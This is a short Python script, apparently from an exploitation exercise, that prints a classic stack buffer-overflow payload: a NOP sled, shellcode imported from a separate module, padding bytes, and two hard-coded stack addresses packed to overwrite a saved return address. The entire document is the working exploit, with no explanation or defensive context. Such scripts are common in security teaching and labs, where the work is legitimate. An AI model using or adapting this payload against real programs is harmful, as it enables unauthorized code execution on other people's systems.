from shellcode import shellcode
from struct import pack
print(('\x90'*1000) + shellcode + ('A'*995) + pack('<I', 0xbffe9490) + pack('<I', 0xbffe9bdc))
